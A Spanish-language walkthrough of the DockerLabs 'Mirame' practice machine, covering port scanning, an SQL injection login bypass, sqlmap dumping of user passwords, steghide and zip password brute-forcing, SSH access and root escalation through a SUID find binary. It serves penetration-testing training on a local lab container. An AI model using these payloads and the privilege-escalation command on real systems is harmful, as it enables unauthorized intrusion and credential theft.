---
icon: flag
---

# Mirame DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip mirame.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh mirame.tar
```

Info:

```
                           ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 12:54 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Login Page
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
```

Si vamos al puerto `80` veremos un panel de login, por lo que intentaremos meter credenciales por defecto, como por ejemplo `admin:admin`, etc... Pero vemos que no hace gran cosa, fuzzearemos un poco por los directorios.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/auth.php             (Status: 200) [Size: 1852]
/index.php            (Status: 200) [Size: 2351]
/page.php             (Status: 200) [Size: 2169]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Nos saca algunas cosas interesantes, pero ninguna de las descubiertas que haga nada interesante, si volvemos al login y probamos inyeccion `mysql`, veremos que funciona si ponemos lo siguiente.

```
User = admin' OR 1=1-- -
Pass = admin' OR 1=1-- -
```

Nos lleva a la `pagina.php` por lo que esta funcionando la inyeccion y sabemos que es vulnerable, ahora pasaremos averiguar la bases de datos que tiene por si tuviera algo interesante dentro.

## SQL Injection

Abriremos BurpSuit para capturar la peticion del login y crear un archivo `request.txt` para utilizar en `sqlmap`.

> request.txt

```
POST /auth.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
Connection: close
Referer: http://172.17.0.2/
Upgrade-Insecure-Requests: 


username=admin&password=admin
```

Una vez teniendo la peticion, iniciaremos la herramienta de `sqlmap` de la siguiente forma.

```shell
sqlmap -r request.txt --dbs
```

Info:

```shell
       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.7#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:11:49 /2024-08-13/

[13:11:49] [INFO] parsing HTTP request from 'request.txt'
[13:11:49] [INFO] testing connection to the target URL
[13:11:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:11:50] [INFO] testing if the target URL content is stable
[13:11:50] [INFO] target URL content is stable
[13:11:50] [INFO] testing if POST parameter '
username' is dynamic
[13:11:50] [WARNING] POST parameter '
username' does not appear to be dynamic
[13:11:50] [WARNING] heuristic (basic) test shows that POST parameter '
username' might not be injectable
[13:11:50] [INFO] testing for SQL injection on POST parameter '
username'
[13:11:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:11:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:11:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:11:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:11:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:11:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:11:50] [INFO] testing 'Generic inline queries'
[13:11:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:11:50] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:11:50] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:11:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:11:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:11:50] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:11:50] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[13:11:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:11:55] [WARNING] POST parameter '
username' does not seem to be injectable
[13:11:55] [INFO] testing if POST parameter 'password' is dynamic
[13:11:55] [WARNING] POST parameter 'password' does not appear to be dynamic
[13:11:55] [INFO] heuristic (basic) test shows that POST parameter 'password' might be injectable (possible DBMS: 'MySQL')
[13:11:55] [INFO] testing for SQL injection on POST parameter 'password'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:12:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:12:01] [WARNING] reflective value(s) found and filtering out
[13:12:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:12:01] [INFO] testing 'Generic inline queries'
[13:12:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:12:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
got a 302 redirect to 'http://172.17.0.2/page.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[13:12:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:12:06] [INFO] POST parameter 'password' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --code=200)
[13:12:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:12:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:12:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:12:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:12:06] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:12:06] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:12:06] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:12:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:12:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:06] [INFO] POST parameter 'password' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:12:06] [INFO] testing 'MySQL inline queries'
[13:12:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:12:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:12:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:12:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:12:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:12:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:12:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:12:16] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:12:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:12:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:12:16] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:12:16] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:12:16] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[13:12:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[13:12:22] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[13:12:25] [INFO] testing 'MySQL UNION query (80) - 21 to 40 columns'
[13:12:25] [INFO] testing 'MySQL UNION query (80) - 41 to 60 columns'
[13:12:25] [INFO] testing 'MySQL UNION query (80) - 61 to 80 columns'
[13:12:25] [INFO] testing 'MySQL UNION query (80) - 81 to 100 columns'
[13:12:25] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 350 HTTP(s) requests:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: 
username=admin&password=admin' OR NOT 7038=7038#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: 
username=admin&password=admin' AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(8275=8275,1))),0x716b767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pyTZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 9281 FROM (SELECT(SLEEP(5)))vxKl)-- xpCW
---
[13:12:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:12:27] [INFO] fetching database names
[13:12:27] [INFO] retrieved: 'information_schema'
[13:12:27] [INFO] retrieved: 'users'
available databases [2]:
[*] information_schema
[*] users

[13:12:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 13:12:27 /2024-08-13/
```

Por lo que vemos a funcionado y nos ha devuelto 2 bases de datos, la que nos interesa es la de `users`.

```shell
sqlmap -r request.txt -D users --tables
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.7#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:14:15 /2024-08-13/

[13:14:15] [INFO] parsing HTTP request from 'request.txt'
[13:14:15] [INFO] resuming back-end DBMS 'mysql' 
[13:14:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: 
username=admin&password=admin' OR NOT 7038=7038#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: 
username=admin&password=admin' AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(8275=8275,1))),0x716b767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pyTZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 9281 FROM (SELECT(SLEEP(5)))vxKl)-- xpCW
---
[13:14:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:14:15] [INFO] fetching tables for database: 'users'
[13:14:15] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[13:14:15] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 13:14:15 /2024-08-13/
```

Por lo que vemos contiene una tabla llamada `usuarios`, por lo que haremos lo siguiente.

```shell
sqlmap -r request.txt -D users -T usuarios --columns
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:15:23 /2024-08-13/

[13:15:23] [INFO] parsing HTTP request from 'request.txt'
[13:15:23] [INFO] resuming back-end DBMS 'mysql' 
[13:15:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: 
username=admin&password=admin' OR NOT 7038=7038#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: 
username=admin&password=admin' AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(8275=8275,1))),0x716b767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pyTZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 9281 FROM (SELECT(SLEEP(5)))vxKl)-- xpCW
---
[13:15:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:15:23] [INFO] fetching columns for table 'usuarios' in database 'users'
[13:15:23] [INFO] retrieved: 'id'
[13:15:24] [INFO] retrieved: 'int(11)'
[13:15:24] [INFO] retrieved: 'username'
[13:15:24] [INFO] retrieved: 'varchar(50)'
[13:15:24] [INFO] retrieved: 'password'
[13:15:24] [INFO] retrieved: 'varchar(255)'
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  |
+----------+--------------+

[13:15:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 13:15:24 /2024-08-13/
```

Ahora sabiendo que las columnas se llaman asi, podremos ver el contenido de cada una haciendo lo siguiente.

```shell
sqlmap -r request.txt -D users -T usuarios -C id,username,password --dump
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:16:02 /2024-08-13/

[13:16:02] [INFO] parsing HTTP request from 'request.txt'
[13:16:02] [INFO] resuming back-end DBMS 'mysql' 
[13:16:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: 
username=admin&password=admin' OR NOT 7038=7038#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: 
username=admin&password=admin' AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(8275=8275,1))),0x716b767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pyTZ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 
username=admin&password=admin' AND (SELECT 9281 FROM (SELECT(SLEEP(5)))vxKl)-- xpCW
---
[13:16:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:16:02] [INFO] fetching entries of column(s) 'id,password,username' for table 'usuarios' in database 'users'
[13:16:02] [INFO] retrieved: '1'
[13:16:02] [INFO] retrieved: 'chocolateadministrador'
[13:16:02] [INFO] retrieved: 'admin'
[13:16:02] [INFO] retrieved: '2'
[13:16:02] [INFO] retrieved: 'lucas'
[13:16:02] [INFO] retrieved: 'lucas'
[13:16:02] [INFO] retrieved: '3'
[13:16:02] [INFO] retrieved: 'soyagustin123'
[13:16:02] [INFO] retrieved: 'agustin'
[13:16:02] [INFO] retrieved: '4'
[13:16:02] [INFO] retrieved: 'directoriotravieso'
[13:16:02] [INFO] retrieved: 'directorio'
Database: users
Table: usuarios
[4 entries]
+----+------------+------------------------+
| id | username   | password               |
+----+------------+------------------------+
| 1  | admin      | chocolateadministrador |
| 2  | lucas      | lucas                  |
| 3  | agustin    | soyagustin123          |
| 4  | directorio | directoriotravieso     |
+----+------------+------------------------+

[13:16:02] [INFO] table 'users.usuarios' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/users/usuarios.csv'
[13:16:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 13:16:02 /2024-08-13/
```

Y por lo que vemos nos saca varios usuarios con sus contraseñas, pero entre esa informacion hay un usuario bastante raro llamado `directorio` y con su contraseña `directoriotravieso` si probamos a meter esa palabra de contraseña en la URL, veremos que nos lleva a un directorio con una imagen llamada `miramebien.jpg`

```
URL = http://<IP>/directoriotravieso/
```

Si nos descargamos esa imagen y vemos que hay dentro de ella.

## Steghide

Utilizaremos `steghide` pero necesitaremos un salvoconducto para que lo extraiga bien, por lo que tiraremos fuerza bruta creando un script en `bash`.

> steghide\_brute\_force.sh

```shell
#!/bin/bash

# Archivo esteganografiado
stegofile="miramebien.jpg"

# Archivo a extraer
outputfile="output.txt"

# Diccionario de contraseñas
wordlist="/usr/share/wordlists/rockyou.txt"

# Fuerza bruta usando el diccionario
while read -r password; do
  echo "Probando: $password"
  steghide extract -sf $stegofile -p "$password" -xf $outputfile -f &> /dev/null
  
  if [ $? -eq 0 ]; then
    echo "¡Contraseña encontrada!: $password"
    exit 0
  fi
done < "$wordlist"

echo "Contraseña no encontrada en el diccionario."
```

Info:

```
Probando: 123456
Probando: 12345
Probando: 123456789
Probando: password
Probando: iloveyou
Probando: princess
Probando: 1234567
Probando: rockyou
Probando: 12345678
Probando: abc123
Probando: nicole
Probando: daniel
Probando: babygirl
Probando: monkey
Probando: lovely
Probando: jessica
Probando: 654321
Probando: michael
Probando: ashley
Probando: qwerty
Probando: 111111
Probando: iloveu
Probando: 000000
Probando: michelle
Probando: tigger
Probando: sunshine
Probando: chocolate
¡Contraseña encontrada!: chocolate
```

Por lo que vemos encontro la contraseña, asi que extraeremos su informacion con ella poniendo lo siguiente.

```shell
steghide extract -sf miramebien.jpg
```

Info:

```
Enter passphrase: 
wrote extracted data to "ocultito.zip".
```

Esto nos dara un archivo `.zip` que llevara tambien contraseña, por lo que haremos lo siguiente.

> NOTA

Tambien podemos utilizar la herramienta `stegseek` para hacer fuerza bruta en la extraccion de contenido oculto de una imagen. (`$ stegseek extract -sf miramebien.jpg -wl <WORDLIST>`)

## zip2john

```shell
zip2john ocultito.zip > hash
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stupid1          (ocultito.zip/secret.txt)     
1g 0:00:00:00 DONE (2024-08-13 13:46) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Por lo que vemos la contraseña es `stupid1`, ahora si que lo podremos descomprimir y obtendremos 2 archivos.

## unzip

```shell
unzip ocultito.zip
```

Info:

```
Archive:  ocultito.zip
[ocultito.zip] secret.txt password: 
 extracting: secret.txt
```

Si leemos el archivo `secret.txt` veremos lo siguiente.

```
carlos:carlitos
```

Son las credenciales de un usuario, por lo que nos conectaremos mediante `ssh`.

## SSH

```shell
ssh carlos@<IP>
```

Metemos la contraseña `carlitos` y ya estariamos dentro.

## Escalate Privilege

Si vemos que permisos `SUID` tenemos, veremos lo siguiente.

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1315452    640 -rwsr-xr-x   1 root     root       653888 Jun 22 19:38 /usr/lib/openssh/ssh-keysign
  1315424     16 -rwsr-xr-x   1 root     root        14416 Nov 30  2023 /usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
  1315395     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1315023    220 -rwsrwxrwx   1 root     root         224848 Jan  8  2023 /usr/bin/find
  1307802     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
  1307865     72 -rwsr-xr-x   1 root     root          72000 Mar 28 09:52 /usr/bin/su
  1307797     60 -rwsr-xr-x   1 root     root          59704 Mar 28 09:52 /usr/bin/mount
  1307889     36 -rwsr-xr-x   1 root     root          35128 Mar 28 09:52 /usr/bin/umount
  1307672     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  1307678     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
  1307739     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  1307813     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
  1315205    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
```

Vemos que `find` esta con permisos de `SUID` por lo que podremos hacer esto.

URL = https://gtfobins.github.io/gtfobins/find/#suid

```shell
find . -exec /bin/sh -p \; -quit
```

Y con esto ya seremos `root`, por lo que terminamos la maquina.
